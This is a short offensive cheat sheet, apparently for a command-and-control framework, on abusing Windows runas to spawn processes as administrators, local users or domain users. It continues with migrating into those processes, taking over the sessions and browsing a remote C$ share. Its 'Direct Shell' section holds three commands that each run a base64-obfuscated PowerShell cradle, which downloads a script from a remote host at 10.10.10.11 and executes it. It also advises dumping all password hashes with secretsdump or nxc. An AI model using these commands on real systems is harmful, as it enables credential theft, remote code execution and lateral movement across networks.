# Runas

## Injection

### 1) Do a runas to get another shell as the local administrator
    
    runas -d . -u Administrator -P 'password' -n -p C:\\windows\\SysWOW64\\notepad.exe
    runas -d . -u Administrator -P 'password' -n -p C:\\Windows\\System32\\cmd.exe


### 2) As another user

    runas -d . -u userooo -P 'Password123@' -n -p C:\\Windows\\System32\\cmd.exe


### 3) Runas a domain user
    
    runas -d domain.com -u user -P 'Password123!' -n -p C:\\windows\\SysWOW64\\notepad.exe
    runas -d domain.com -u user -P 'Password123!' -n -p C:\\Windows\\System32\\cmd.exe


### 4) Find process

    ps -e notepad


### 5) Migrate into the process

    migrate -p 11216


### 6) Use the new session

    use c4578a6f

### 7) List the C$ 

    ls //machine02.domain.com/c$

## Direct Shell

Sometimes the local user won't work, if that's the case and you have the local admin's password, just run nxc or secretsdump to dump all hashes and psexec/atexec as the user.

### 1) Domain User
    
    runas -d domain.com -u user -P password -n -p "C:\Windows\System32\cmd.exe" -a "/c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="


### 2) Local Admin
    
    runas -d . -u Administrator -P 'password'-n -p "C:\Windows\System32\cmd.exe" -a "/c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="


### 3) Local User

    runas -d . -u userooo -P 'Password123@' -n -p "C:\Windows\System32\cmd.exe" -a "/c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="
